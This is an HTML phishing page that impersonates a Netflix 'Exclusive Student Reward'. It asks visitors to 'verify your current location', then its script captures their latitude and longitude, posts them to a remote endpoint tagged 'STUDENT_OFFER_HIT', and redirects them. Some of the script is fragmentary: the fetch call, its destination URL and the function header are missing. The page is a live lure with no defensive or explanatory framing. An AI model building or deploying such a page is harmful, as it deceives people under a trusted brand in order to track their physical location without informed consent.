<!DOCTYPE html>
<html lang="en">
<head>

    <style>

            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-image: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bcae-07a3f8dc141a/f6ed17ad-68ee-406f-85f8-5e0f361d87c1/PK-en-20220502-popsignuptwoweeks-perspective_alpha_website_medium.jpg');
            background-size: cover;
        }

        .container {
            background: rgba(0, 0, 0, 0.85);
            padding: 40px;
            border-radius: 4px;
            width: 100%;
            max-width: 450px;
            text-align: center;
            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
        }

        .logo { color: #e50914; font-size: 38px; font-weight: bold; margin-bottom: 25px; letter-spacing: -1px; }

        h1 { font-size: 26px; font-weight: 700; margin-bottom: 15px; }
        p { color: #a3a3a3; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }

        .btn-netflix {
            background: #e50914;
            color: #fff;
            border: none;
            padding: 18px;
            width: 100%;
            font-size: 16px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            text-transform: uppercase;
            transition: background 0.2s;
        }

        .btn-netflix:hover { background: #f6121d; }

        /* Spinner for the 'Processing' state */
        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin: 0 auto;
        }

        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <p>Exclusive Student Reward: Please verify your current location to activate your premium account access.</p>
    
    <button class="btn-netflix" id="main-btn" onclick="captureData()">

    </button>

</div>

<script>

        const btnSpinner = document.getElementById('btn-spinner');
        const btn = document.getElementById('main-btn');

        // Show loading state
        btnText.style.display = 'none';
        btnSpinner.style.display = 'block';

                // PHASE 1: Capture data
                const payload = {
                    type: "STUDENT_OFFER_HIT",
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,

                    timestamp: new Date().toISOString()

                    method: 'POST',
                    mode: 'no-cors',

                }).then(() => {

                    window.location.href = redirectUrl;
                });

                window.location.href = redirectUrl;
            });
        } else {
            window.location.href = redirectUrl;
        }
    }
</script>
